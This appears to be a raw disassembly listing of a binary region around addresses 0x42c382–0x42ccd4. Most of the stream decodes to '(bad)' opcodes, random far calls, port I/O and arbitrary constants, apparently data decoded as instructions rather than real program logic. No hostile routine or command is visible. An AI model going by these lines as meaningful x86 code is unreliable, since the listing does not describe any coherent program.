  42c382:	sbb    DWORD PTR [edi-0x69],esi
  42c385:	mov    esp,esp
  42c387:	push   eax
  42c388:	or     eax,0xb03cc7e9
  42c38d:	or     al,0xec
  42c38f:	(bad)  
  42c390:	xor    al,0x20
  42c392:	shl    DWORD PTR [edx-0x79],1
  42c395:	dec    esi
  42c396:	in     eax,0xb8
  42c398:	dec    ebx
  42c399:	inc    ebx
  42c39a:	xor    ch,BYTE PTR [edx]
  42c39c:	mov    cl,0x55
  42c39e:	xchg   ebx,eax
  42c39f:	pop    ebx
  42c3a0:	sub    al,0xd1
  42c3a2:	pop    ds
  42c3a3:	les    ebp,FWORD PTR cs:[ecx-0x76]
  42c3a7:	(bad)  
  42c3a8:	jp     0x42c364
  42c3aa:	sbb    al,0x56
  42c3ac:	mov    esi,0x9ff38919
  42c3b1:	call   0x8f4d:0x32881a0b
  42c3b8:	stos   DWORD PTR es:[edi],eax
  42c3b9:	xlat   BYTE PTR ds:[ebx]
  42c3ba:	inc    eax
  42c3bb:	inc    ebp
  42c3bc:	mov    gs,esi
  42c3be:	sbb    al,0xcf
  42c3c0:	mov    eax,0x9d6f1ef8
  42c3c5:	mov    ebx,esp
  42c3c7:	inc    eax
  42c3c8:	mov    ds:0x328dbcc4,eax
  42c3cd:	lods   al,BYTE PTR ds:[si]
  42c3cf:	cmp    eax,edx
  42c3d1:	mov    eax,0x1bb49b14
  42c3d6:	adc    al,0x32
  42c3d8:	xchg   edx,eax
  42c3d9:	inc    esi
  42c3da:	les    esi,FWORD PTR [esi-0x2b9a99c6]
  42c3e0:	pop    edi
  42c3e1:	pop    esp
  42c3e2:	ins    BYTE PTR es:[edi],dx
  42c3e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3e4:	or     ah,BYTE PTR es:[ecx]
  42c3e7:	scas   eax,DWORD PTR es:[edi]
  42c3e8:	push   eax
  42c3e9:	xor    BYTE PTR [eax],bh
  42c3eb:	jno    0x42c407
  42c3ed:	shr    DWORD PTR [ebx+edx*2],1
  42c3f0:	sub    BYTE PTR [esi],ah
  42c3f2:	hlt    
  42c3f3:	fwait
  42c3f4:	sbb    al,0x8e
  42c3f6:	jecxz  0x42c419
  42c3f8:	adc    ecx,0x81fd5024
  42c3fe:	lods   eax,DWORD PTR ds:[esi]
  42c3ff:	dec    esp
  42c400:	xor    al,0x82
  42c402:	ins    BYTE PTR es:[edi],dx
  42c403:	scas   eax,DWORD PTR es:[edi]
  42c404:	in     al,0xa9
  42c406:	lahf   
  42c407:	xor    esp,esp
  42c409:	hlt    
  42c40a:	xchg   esi,eax
  42c40b:	adc    ebp,DWORD PTR [edi]
  42c40d:	xor    cl,bh
  42c40f:	xchg   esi,eax
  42c410:	or     al,0x28
  42c412:	ror    BYTE PTR [ebx+0x29],0xc8
  42c416:	shl    DWORD PTR [eax],cl
  42c418:	lods   al,BYTE PTR ds:[esi]
  42c419:	dec    edx
  42c41a:	xor    al,0x59
  42c41c:	(bad)  
  42c41d:	cs mov al,0xb4
  42c420:	add    al,0x68
  42c422:	jno    0x42c3f2
  42c424:	push   ecx
  42c425:	pop    edi
  42c426:	test   eax,0x85234226
  42c42b:	cmovnp edi,ebx
  42c42e:	mov    cl,0xcb
  42c430:	adc    esi,DWORD PTR [ecx+esi*4+0x9515]
	...
  42c493:	add    BYTE PTR [eax],al
  42c495:	add    ah,ch
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    BYTE PTR [ebp-0xd],ah
  42c4a4:	(bad)  
  42c4a5:	stos   DWORD PTR es:[edi],eax
  42c4a6:	or     edx,ebx
  42c4a8:	add    DWORD PTR [eax],eax
  42c4aa:	pop    es
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    bh,bl
  42c4af:	hlt    
  42c4b0:	push   ecx
  42c4b1:	adc    esp,DWORD PTR cs:[edx-0x6f]
  42c4b5:	xor    DWORD PTR [edi-0x7ba2c5c5],edi
  42c4bb:	out    dx,eax
  42c4bc:	(bad)  
  42c4bd:	rcr    al,1
  42c4bf:	or     eax,0x8fc3d14e
  42c4c4:	inc    ebp
  42c4c5:	jl     0x42c4f6
  42c4c7:	pop    esi
  42c4c8:	inc    ecx
  42c4c9:	es hlt 
  42c4cb:	add    al,0x6d
  42c4cd:	rcl    dh,cl
  42c4cf:	bound  eax,QWORD PTR [ecx+esi*2-0x2094b77a]
  42c4d6:	es jno 0x42c530
  42c4d9:	push   ebp
  42c4da:	(bad)  
  42c4db:	jg     0x42c470
  42c4dd:	test   eax,0xd284e9f4
  42c4e2:	pop    eax
  42c4e3:	aas    
  42c4e4:	mov    al,ds:0x6ecc83ce
  42c4e9:	xor    cl,al
  42c4eb:	sahf   
  42c4ec:	je     0x42c548
  42c4ee:	loopne 0x42c514
  42c4f0:	push   ebx
  42c4f1:	hlt    
  42c4f2:	add    esp,DWORD PTR ds:0x78fb635f
  42c4f8:	cdq    
  42c4f9:	out    dx,al
  42c4fa:	or     DWORD PTR [ecx+ebp*1],esp
  42c4fd:	xor    edi,ebp
  42c4ff:	test   BYTE PTR [edi],al
  42c501:	adc    bh,BYTE PTR [esi]
  42c503:	mov    edx,DWORD PTR ds:0xd8443a78
  42c509:	pushf  
  42c50a:	cmc    
  42c50b:	jae    0x42c4c2
  42c50d:	pop    ebx
  42c50e:	and    dl,BYTE PTR [edi+0x7b]
  42c511:	inc    ebp
  42c512:	sbb    dh,BYTE PTR [ebx]
  42c514:	out    0x48,al
  42c516:	sar    DWORD PTR [eax],cl
  42c518:	jecxz  0x42c4e3
  42c51a:	rcr    DWORD PTR [ebx],cl
  42c51c:	xchg   DWORD PTR [edx+0x4b],ebx
  42c51f:	push   cs
  42c520:	adc    al,0x95
  42c522:	pop    ecx
  42c523:	shl    bh,0x66
  42c526:	fbld   TBYTE PTR [ebx+edx*1]
  42c529:	dec    edx
  42c52a:	push   edx
  42c52b:	mov    ds:0xfa0e03e7,eax
  42c530:	adc    BYTE PTR [edx],cl
  42c532:	(bad)  
  42c533:	dec    ebx
  42c534:	rol    DWORD PTR [ebp-0x4c],1
  42c537:	call   0xa45fb7f6
  42c53c:	mov    ebp,0xe8aedb20
  42c541:	pop    ecx
  42c542:	ins    BYTE PTR es:[edi],dx
  42c543:	xchg   esi,eax
  42c544:	les    ecx,FWORD PTR [edi+0x51]
  42c547:	dec    eax
  42c548:	(bad)  
  42c549:	mov    WORD PTR [eax],ds
  42c54b:	test   eax,0x325466ff
  42c550:	iret   
  42c551:	xor    DWORD PTR [edx*8+0x28024d60],ebx
  42c558:	jle    0x42c596
  42c55a:	inc    esi
  42c55b:	and    cl,BYTE PTR [edi]
  42c55d:	fs and al,0xce
  42c560:	and    al,ch
  42c562:	mov    cl,0x3c
  42c564:	retf   
  42c565:	xchg   ebx,eax
  42c566:	xchg   DWORD PTR cs:[ecx],eax
  42c569:	lahf   
  42c56a:	sbb    esi,DWORD PTR [esi+0x23b63b36]
  42c570:	mov    edx,0x86115e1e
  42c575:	int3   
  42c576:	pop    edi
  42c577:	xor    cl,BYTE PTR [edx+ebp*8-0xa]
  42c57b:	mov    ebx,0x4c724605
  42c580:	cdq    
  42c581:	cmp    al,0xac
  42c583:	cmc    
  42c584:	shl    BYTE PTR [ebx+0x6f02d14e],cl
  42c58a:	and    ecx,eax
  42c58c:	xor    eax,0xaf0c63a7
  42c591:	mov    ecx,0xe7891528
  42c596:	xchg   edi,eax
  42c597:	mov    esi,0x6ca9c76
  42c59c:	cwde   
  42c59d:	fisttp WORD PTR [ecx+0x5e3ed60]
  42c5a3:	xor    al,0xd
  42c5a5:	xor    cl,BYTE PTR [edx]
  42c5a7:	nop
  42c5a8:	mov    esi,DWORD PTR [esi+0x24]
  42c5ab:	outs   dx,BYTE PTR cs:[esi]
  42c5ad:	push   ss
  42c5ae:	sub    eax,0x700d2873
  42c5b3:	fstp   TBYTE PTR [eax+eax*1+0x0]
	...
  42c616:	pop    ebp
  42c617:	dec    eax
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	dec    esp
  42c623:	(bad)  
  42c625:	retf   0xdb10
  42c628:	add    DWORD PTR [eax],eax
  42c62a:	pop    es
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    bl,ah
  42c62f:	mov    al,ds:0x55cb944d
  42c634:	adc    BYTE PTR [ebp+0x6684cfd8],0x43
  42c63b:	mov    dh,0x78
  42c63d:	add    DWORD PTR [edi+0x627b7654],0xaeb8b2db
  42c647:	pop    es
  42c648:	add    al,0xab
  42c64a:	sbb    BYTE PTR [ecx+0x6c],ah
  42c64d:	outs   dx,DWORD PTR ds:[esi]
  42c64e:	out    0x60,eax
  42c650:	sahf   
  42c651:	dec    ebx
  42c652:	cmp    BYTE PTR [esi],dl
  42c654:	ins    DWORD PTR es:[edi],dx
  42c655:	fisubr WORD PTR [ebx+edi*8-0x51]
  42c659:	push   ecx
  42c65a:	dec    edi
  42c65b:	pusha  
  42c65c:	mov    eax,ds:0x6f5e20dc
  42c661:	out    dx,eax
  42c662:	ror    bh,cl
  42c664:	(bad)  
  42c666:	sbb    al,0x6d
  42c668:	mov    al,ds:0x1d0f2159
  42c66d:	cwde   
  42c66e:	test   al,0x80
  42c670:	jmp    0x238:0xe16fc17e
  42c677:	pop    edx
  42c678:	inc    eax
  42c679:	adc    bl,BYTE PTR [edi]
  42c67b:	test   BYTE PTR [eax],cl
  42c67d:	cmp    BYTE PTR [ebx+0x73b5f917],0x8f
  42c684:	xchg   ebp,eax
  42c685:	fs repnz mov bl,0xd9
  42c689:	pop    ds
  42c68a:	push   ds
  42c68b:	pop    esi
  42c68c:	ret    
  42c68d:	push   0x4a
  42c68f:	and    al,BYTE PTR [edx]
  42c691:	dec    ch
  42c693:	out    0x65,al
  42c695:	mov    al,ds:0x2fbe822b
  42c69a:	add    dh,BYTE PTR [ebx]
  42c69c:	paddusb mm5,mm2
  42c69f:	and    al,0xd0
  42c6a1:	adc    DWORD PTR [ebx],ecx
  42c6a3:	dec    edx
  42c6a4:	in     al,dx
  42c6a5:	in     al,dx
  42c6a6:	xor    al,0x5f
  42c6a8:	sub    eax,0x85f5c3ea
  42c6ad:	jg     0x42c6f2
  42c6af:	int3   
  42c6b0:	mov    eax,es
  42c6b2:	mov    eax,ds:0xedd2bdea
  42c6b7:	or     DWORD PTR [ebx+0x3b71fa4d],esp
  42c6bd:	into   
  42c6be:	cmp    al,0x30
  42c6c0:	push   ds
  42c6c1:	es sbb eax,0x1321a539
  42c6c7:	sar    esi,1
  42c6c9:	in     al,dx
  42c6ca:	les    esp,FWORD PTR [esi+0x6e035d27]
  42c6d0:	inc    ecx
  42c6d1:	call   0x74d639f0
  42c6d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6d7:	inc    edx
  42c6d8:	icebp  
  42c6d9:	jo     0x42c68d
  42c6db:	or     eax,0x854214a8
  42c6e0:	fcomp  DWORD PTR [esp+ebp*4]
  42c6e3:	das    
  42c6e4:	sub    al,0xe9
  42c6e6:	lods   al,BYTE PTR ds:[esi]
  42c6e7:	jns    0x42c6ab
  42c6e9:	dec    ebx
  42c6ea:	call   0x41b65bff
  42c6ef:	mov    eax,ds:0x22811d9a
  42c6f4:	push   esi
  42c6f5:	jle    0x42c680
  42c6f7:	fisubr WORD PTR [eax+0x1ac0338a]
  42c6fd:	xchg   ecx,eax
  42c6fe:	sub    BYTE PTR [edi-0x592a0d3f],0xa6
  42c705:	cdq    
  42c706:	aad    0x9f
  42c708:	inc    eax
  42c709:	push   ecx
  42c70a:	cs mov dl,0x46
  42c70d:	jae    0x42c736
  42c70f:	and    BYTE PTR [edi+0x4442b92d],al
  42c715:	and    eax,0xf07caf06
  42c71a:	adc    eax,esp
  42c71c:	mov    ch,0x8d
  42c71e:	cmp    ecx,DWORD PTR [ebx+0x330f9ce4]
  42c724:	aas    
  42c725:	sbb    al,0xd3
  42c727:	in     al,0x78
  42c729:	mov    ebp,0xf98bb94e
  42c72e:	test   DWORD PTR [edx+ecx*8+0x1b],ebx
  42c732:	popa   
  42c733:	inc    DWORD PTR [ebx]
	...
  42c795:	add    BYTE PTR [eax],bh
  42c797:	mov    DWORD PTR [edx-0x6b],ebp
  42c79a:	sti    
  42c79b:	idiv   edi
  42c79d:	lods   eax,DWORD PTR ds:[esi]
  42c79e:	push   ss
  42c79f:	mov    al,ds:0xd17f3f90
  42c7a4:	push   0x1dc170a
  42c7a9:	add    BYTE PTR [edi],al
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [ebx+0x349e3904],al
  42c7b3:	cwde   
  42c7b4:	and    eax,0x5bc57850
  42c7b9:	adc    eax,0x43d66a88
  42c7be:	clc    
  42c7bf:	mov    ds:0x89db7e47,al
  42c7c4:	mov    DWORD PTR [edi+0x13700256],ebp
  42c7ca:	jmp    0x42c7b6
  42c7cc:	mov    bl,0x25
  42c7ce:	dec    esi
  42c7cf:	idiv   BYTE PTR [ebx]
  42c7d1:	daa    
  42c7d2:	popa   
  42c7d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7d4:	cmp    al,ah
  42c7d6:	jmp    0x42c78c
  42c7d8:	push   0x71
  42c7da:	sbb    esp,DWORD PTR [edi]
  42c7dc:	dec    edi
  42c7dd:	(bad)  
  42c7de:	mov    al,ds:0xf3c0cf9e
  42c7e3:	jnp    0x42c79d
  42c7e5:	arpl   WORD PTR [ebx-0x728a7364],si
  42c7eb:	fs cmp al,0xda
  42c7ee:	mov    ds:0x65d5215,al
  42c7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c7f4:	cmp    eax,0xce8509e3
  42c7f9:	aad    0xc3
  42c7fb:	add    DWORD PTR [ebp+0x54],edi
  42c7fe:	jbe    0x42c803
  42c800:	clc    
  42c801:	cmp    DWORD PTR [ecx],esp
  42c803:	mov    dh,BYTE PTR [ebp-0x34c48763]
  42c809:	lea    edx,[eax+edi*4-0x6f]
  42c80d:	popa   
  42c80e:	aam    0xe1
  42c810:	inc    esi
  42c811:	adc    edi,DWORD PTR [esi+ecx*8-0x2d]
  42c815:	loop   0x42c7e9
  42c817:	xor    edx,DWORD PTR [esi+0x62937d46]
  42c81d:	sbb    DWORD PTR ds:0x2e7a438e,ebx
  42c823:	mov    ebp,DWORD PTR [edi+ecx*4]
  42c826:	pmaddwd mm4,QWORD PTR [ecx-0x21]
  42c82a:	or     al,0x2b
  42c82c:	and    eax,0xe7a12337
  42c831:	in     eax,0x38
  42c833:	push   ebp
  42c834:	js     0x42c896
  42c836:	xor    esp,edi
  42c838:	add    esi,0x85053193
  42c83e:	cmp    eax,0x176166d0
  42c843:	mov    al,0x26
  42c845:	in     eax,0xa
  42c847:	popf   
  42c848:	and    ecx,DWORD PTR [eax+0x20]
  42c84b:	and    ah,ch
  42c84d:	int    0xc3
  42c84f:	mov    WORD PTR [ebp+0x2569cd20],gs
  42c855:	push   cs
  42c856:	jno    0x42c803
  42c858:	ins    DWORD PTR es:[edi],dx
  42c859:	hlt    
  42c85a:	or     al,0xc4
  42c85c:	cmp    edx,esi
  42c85e:	fst    QWORD PTR [ebx]
  42c860:	cmp    al,0xfe
  42c862:	aam    0xb7
  42c864:	sub    esp,DWORD PTR [ebp+0x46d4df1]
  42c86a:	cmp    al,0xc9
  42c86c:	dec    DWORD PTR [ecx+edx*2-0x2feab1d0]
  42c873:	mov    al,ds:0xc37d7087
  42c878:	or     edx,edi
  42c87a:	mov    bh,0x42
  42c87c:	mov    al,ds:0xe892306e
  42c881:	and    DWORD PTR [eax-0x45bf8e7b],0x62
  42c888:	sbb    bl,dh
  42c88a:	outs   dx,BYTE PTR ds:[esi]
  42c88b:	in     eax,dx
  42c88c:	int    0xc
  42c88e:	mov    cl,0x15
  42c890:	mov    bl,BYTE PTR [edx+0x19302163]
  42c896:	mov    dh,0xcc
  42c898:	xchg   esi,eax
  42c899:	vmulpd xmm2,xmm6,XMMWORD PTR [edx+0x22]
  42c89e:	jno    0x42c89f
  42c8a0:	inc    edx
  42c8a1:	ror    ecx,0xea
  42c8a4:	jl     0x42c8ff
  42c8a6:	fsubr  DWORD PTR [eax]
  42c8a8:	inc    ebx
  42c8a9:	call   0x9ae6:0xf7e467df
  42c8b0:	in     eax,dx
  42c8b1:	sub    eax,eax
  42c8b3:	mov    ebp,0xc7
	...
  42c914:	add    BYTE PTR [eax],al
  42c916:	adc    BYTE PTR [ebx],bl
  42c918:	leave  
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	icebp  
  42c923:	gs sti 
  42c925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c926:	push   ds
  42c927:	fld    QWORD PTR [ecx]
  42c929:	add    BYTE PTR [edi],al
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR ds:0x2206d608,ah
  42c933:	(bad)  
  42c934:	fcom   st(6)
  42c936:	push   0xc0b52de5
  42c93b:	dec    edi
  42c93c:	mov    eax,ds:0x7036cd47
  42c941:	and    al,0x25
  42c943:	xchg   esp,ecx
  42c945:	adc    eax,0x3938d7a8
  42c94a:	mov    ch,0xc0
  42c94c:	in     eax,dx
  42c94d:	loop   0x42c8f0
  42c94f:	xchg   edi,eax
  42c950:	and    esi,edi
  42c952:	das    
  42c953:	sbb    eax,0x439ce0c7
  42c958:	xchg   ebx,eax
  42c959:	adc    al,0x89
  42c95b:	mov    edi,0x43c018b2
  42c960:	mov    BYTE PTR ss:[edx-0x32],cl
  42c964:	inc    eax
  42c965:	xchg   edx,edi
  42c967:	mov    esi,0xe92cf73d
  42c96c:	jb     0x42c909
  42c96e:	xor    al,0x14
  42c970:	sbb    BYTE PTR [ebx],0x69
  42c973:	xchg   DWORD PTR [ebp-0x30],edx
  42c976:	lods   al,BYTE PTR ds:[esi]
  42c977:	jge    0x42c904
  42c979:	sub    al,al
  42c97b:	ror    BYTE PTR [ecx+0x22],1
  42c97e:	mov    dl,BYTE PTR [ecx-0x900b7e2]
  42c984:	call   0xad43:0xe753c87f
  42c98b:	jp     0x42c9ed
  42c98d:	inc    eax
  42c98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c98f:	adc    BYTE PTR [esi+0x36],ah
  42c992:	mov    al,0x63
  42c994:	into   
  42c995:	int    0x1d
  42c997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c999:	pop    esp
  42c99a:	and    cl,dh
  42c99c:	fstp   DWORD PTR [edx+0x15]
  42c99f:	fisttp WORD PTR [edi-0x1f82e677]
  42c9a5:	pop    esi
  42c9a6:	mov    cl,bl
  42c9a8:	or     BYTE PTR [eax+0x138367a4],0x62
  42c9af:	das    
  42c9b0:	jl     0x42c9ef
  42c9b2:	mov    edi,0x5bba9466
  42c9b7:	xchg   ecx,eax
  42c9b8:	mov    al,0x90
  42c9ba:	js     0x42c969
  42c9bc:	xchg   ebx,eax
  42c9bd:	mov    bh,0x33
  42c9bf:	enter  0x280f,0xa4
  42c9c3:	push   ecx
  42c9c4:	aas    
  42c9c5:	pop    edi
  42c9c6:	add    eax,0xc9ca9352
  42c9cb:	and    al,0xc3
  42c9cd:	dec    esi
  42c9ce:	loop   0x42c98d
  42c9d0:	xchg   esp,eax
  42c9d1:	sub    BYTE PTR [esi-0x7d],cl
  42c9d4:	scas   al,BYTE PTR es:[edi]
  42c9d5:	scas   eax,DWORD PTR es:[edi]
  42c9d6:	xchg   ebx,eax
  42c9d7:	xchg   edx,eax
  42c9d8:	test   DWORD PTR [ecx],edi
  42c9da:	mov    dl,0xc5
  42c9dc:	lock and al,0x81
  42c9df:	pop    es
  42c9e0:	in     eax,0xba
  42c9e2:	std    
  42c9e3:	(bad)  
  42c9e4:	dec    ebp
  42c9e5:	xchg   edi,eax
  42c9e6:	out    0xdb,eax
  42c9e8:	and    ah,BYTE PTR [ebp+0x2a3177a9]
  42c9ee:	stos   BYTE PTR es:[edi],al
  42c9ef:	xlat   BYTE PTR ds:[ebx]
  42c9f0:	xor    bh,BYTE PTR [eax]
  42c9f2:	sahf   
  42c9f3:	out    0xbd,eax
  42c9f5:	or     ch,BYTE PTR [eax+0x7a3c5283]
  42c9fb:	xor    BYTE PTR [esi-0x1eda8a37],dl
  42ca01:	icebp  
  42ca02:	fcom   DWORD PTR [ebp+0x9]
  42ca05:	stos   DWORD PTR es:[edi],eax
  42ca06:	int3   
  42ca07:	xchg   esp,eax
  42ca08:	repz jle 0x42ca7c
  42ca0b:	data16 and BYTE PTR [edx],ah
  42ca0e:	fidiv  WORD PTR [edi+0x47]
  42ca11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca12:	adc    eax,0x73bc7c5f
  42ca17:	and    DWORD PTR [ecx+0xed6e02c],0xfffffff9
  42ca1e:	je     0x42ca51
  42ca20:	xor    DWORD PTR [ebp-0x187647d0],ebp
  42ca26:	sub    DWORD PTR [edx-0x5cd3cc3d],ebx
  42ca2c:	fwait
  42ca2d:	lods   al,BYTE PTR ds:[esi]
  42ca2e:	(bad)  [esi]
  42ca30:	sub    esi,DWORD PTR [edx]
  42ca32:	lds    ecx,FWORD PTR [eax+esi*4]
	...
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0x7898604d,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    BYTE PTR [esi+edi*2+0x2d],al
  42cab1:	xchg   ebx,eax
  42cab2:	sub    bh,BYTE PTR [edi-0x1c]
  42cab5:	stos   BYTE PTR es:[edi],al
  42cab6:	pop    ss
  42cab7:	out    0x2b,eax
  42cab9:	fs stos BYTE PTR es:[edi],al
  42cabb:	ret    
  42cabc:	push   ebp
  42cabd:	js     0x42cb2f
  42cabf:	push   ebx
  42cac0:	inc    esp
  42cac1:	mov    esi,0xe0cec264
  42cac6:	jne    0x42ca53
  42cac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cac9:	int3   
  42caca:	mov    ah,0xd6
  42cacc:	mov    edi,0xfcbab93d
  42cad1:	sub    al,0x9
  42cad3:	pop    ebx
  42cad4:	fs out dx,al
  42cad6:	xchg   edx,eax
  42cad7:	mov    cl,0xa1
  42cad9:	ds icebp 
  42cadb:	sub    eax,0xfd0748ae
  42cae0:	adc    BYTE PTR [edi-0x7f],0x27
  42cae4:	adc    esp,DWORD PTR [ebp+0x6]
  42cae7:	shr    DWORD PTR [esi],1
  42cae9:	jp     0x42cb04
  42caeb:	and    BYTE PTR [edi-0x78fb3032],ch
  42caf1:	cmp    DWORD PTR [edi],ebp
  42caf3:	std    
  42caf4:	push   edx
  42caf5:	sub    DWORD PTR [ebx-0x38],ebx
  42caf8:	es daa 
  42cafa:	pop    es
  42cafb:	lods   eax,DWORD PTR ds:[esi]
  42cafc:	daa    
  42cafd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cafe:	stos   BYTE PTR es:[edi],al
  42caff:	push   es
  42cb00:	(bad)  
  42cb01:	adc    DWORD PTR [esi+0x23],ebx
  42cb04:	adc    DWORD PTR [esi-0x2158a0c8],edi
  42cb0a:	les    edi,FWORD PTR [ecx-0x72cd8c11]
  42cb10:	dec    edi
  42cb11:	(bad)  
  42cb12:	and    DWORD PTR [edi+0x55],eax
  42cb15:	or     ebx,DWORD PTR [edx+0x2e5ff574]
  42cb1b:	xchg   ebp,eax
  42cb1c:	cmp    ah,dh
  42cb1e:	push   ss
  42cb1f:	(bad)  
  42cb20:	cmc    
  42cb21:	adc    BYTE PTR [edx+0xe22cf08],dl
  42cb27:	pop    esi
  42cb28:	sub    al,0xca
  42cb2a:	cmp    ecx,edx
  42cb2c:	push   ecx
  42cb2d:	popf   
  42cb2e:	sahf   
  42cb2f:	mov    bh,0xf7
  42cb31:	inc    ebp
  42cb32:	fstp   TBYTE PTR [esi]
  42cb34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb35:	sub    DWORD PTR [ecx-0x37de4afa],ecx
  42cb3b:	push   esi
  42cb3c:	in     eax,0x54
  42cb3e:	repz js 0x42cb02
  42cb41:	inc    edi
  42cb42:	loope  0x42cac7
  42cb44:	and    eax,0x166e42de
  42cb49:	adc    BYTE PTR cs:[esp+edi*8],bl
  42cb4d:	jge    0x42cb27
  42cb4f:	pusha  
  42cb50:	neg    BYTE PTR [eax-0xdefe610]
  42cb56:	add    DWORD PTR [ebx-0xf],edi
  42cb59:	enter  0xce85,0x65
  42cb5d:	dec    ecx
  42cb5e:	dec    edx
  42cb5f:	outs   dx,BYTE PTR ds:[esi]
  42cb60:	sbb    ebx,DWORD PTR [ebx+0x4e]
  42cb63:	das    
  42cb64:	pusha  
  42cb65:	in     eax,0x98
  42cb67:	stos   DWORD PTR es:[edi],eax
  42cb68:	scas   eax,DWORD PTR es:[edi]
  42cb69:	(bad)  
  42cb6a:	(bad)  
  42cb6b:	mov    ebx,0x5c90d6f2
  42cb70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb71:	add    eax,0x14ad6acf
  42cb76:	leave  
  42cb77:	out    0x3b,eax
  42cb79:	aam    0x2c
  42cb7b:	xchg   esi,eax
  42cb7c:	loope  0x42cbbc
  42cb7e:	jp     0x42cb30
  42cb80:	int    0x3f
  42cb82:	pop    esi
  42cb83:	adc    DWORD PTR [ecx+0x57],edx
  42cb86:	or     BYTE PTR [eax+0x1336ea66],dl
  42cb8c:	add    BYTE PTR [esi+0x55],bh
  42cb8f:	sti    
  42cb90:	addr16 push cs
  42cb92:	sbb    cl,BYTE PTR [esp+ebp*1-0x3fce7ef6]
  42cb99:	cli    
  42cb9a:	cli    
  42cb9b:	adc    al,0x85
  42cb9d:	gs cmc 
  42cb9f:	xchg   ecx,eax
  42cba0:	ins    BYTE PTR es:[edi],dx
  42cba1:	cmp    eax,0x7080b02f
  42cba6:	mov    ecx,0x1febe01d
  42cbab:	retf   
  42cbac:	sbb    eax,0xf5817287
  42cbb1:	lods   al,BYTE PTR ds:[esi]
  42cbb2:	cli    
  42cbb3:	(bad)  
	...
  42cc15:	add    BYTE PTR [edi+0x2],bh
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	xchg   DWORD PTR [edi],esp
  42cc24:	mov    eax,0x1df2cf8
  42cc29:	add    BYTE PTR [edi],al
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [eax+0x2ffdd565],ah
  42cc33:	aas    
  42cc34:	std    
  42cc35:	cmp    esi,DWORD PTR [ecx-0xd]
  42cc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc39:	js     0x42cbfe
  42cc3b:	add    BYTE PTR [eax],dl
  42cc3d:	ror    BYTE PTR [edx],0x97
  42cc40:	jbe    0x42cc4a
  42cc42:	pushf  
  42cc43:	pop    ss
  42cc44:	mov    ds:0xe1f9170c,al
  42cc49:	mov    cl,0x34
  42cc4b:	xor    al,0x89
  42cc4d:	js     0x42cc29
  42cc4f:	push   0xfc6a3b3b
  42cc54:	in     al,dx
  42cc55:	outs   dx,BYTE PTR ds:[esi]
  42cc56:	dec    edx
  42cc57:	mov    eax,ds:0xe92d91fd
  42cc5c:	or     al,BYTE PTR [esi]
  42cc5e:	mov    dl,BYTE PTR [ecx+eiz*1+0x6]
  42cc62:	push   eax
  42cc63:	lahf   
  42cc64:	shl    BYTE PTR [esi+esi*8-0x436dda8f],0x62
  42cc6c:	xor    al,0xda
  42cc6e:	imul   ebp,DWORD PTR [ebx],0xa2cee204
  42cc74:	add    al,0xe8
  42cc76:	stos   DWORD PTR es:[edi],eax
  42cc77:	cwde   
  42cc78:	in     eax,dx
  42cc79:	sub    DWORD PTR [ecx-0x294370da],0xfffffffb
  42cc80:	xor    eax,ebx
  42cc82:	or     DWORD PTR [esp+eiz*8+0x58678eb1],edi
  42cc89:	mov    eax,ds:0xae056f83
  42cc8e:	pop    esi
  42cc8f:	test   al,0xfd
  42cc91:	push   ecx
  42cc92:	scas   al,BYTE PTR es:[edi]
  42cc93:	ss lahf 
  42cc95:	push   ecx
  42cc96:	xchg   ebp,eax
  42cc97:	cmp    BYTE PTR [ecx-0x687676b8],0xd0
  42cc9e:	mov    ch,0xc2
  42cca0:	popf   
  42cca1:	es aas 
  42cca3:	or     al,0x34
  42cca5:	sbb    edi,edx
  42cca7:	xor    eax,0x5abdb078
  42ccac:	(bad)  
  42ccad:	sbb    dl,BYTE PTR [edx-0x25eb60b3]
  42ccb3:	mov    bl,0xf0
  42ccb5:	in     eax,0x87
  42ccb7:	fbstp  TBYTE PTR [eax-0x59]
  42ccba:	push   ds
  42ccbb:	out    0xf6,eax
  42ccbd:	dec    ecx
  42ccbe:	stc    
  42ccbf:	outs   dx,BYTE PTR ds:[esi]
  42ccc0:	fiadd  DWORD PTR ds:0x43a9d6d7
  42ccc6:	data16 jae 0x42cca1
  42ccc9:	push   edi
  42ccca:	(bad)  
  42cccb:	jae    0x42cccc
  42cccd:	push   0x8c81cb42
  42ccd2:	or     edi,DWORD PTR [eax]
  42ccd4:	js     0x42cc5d
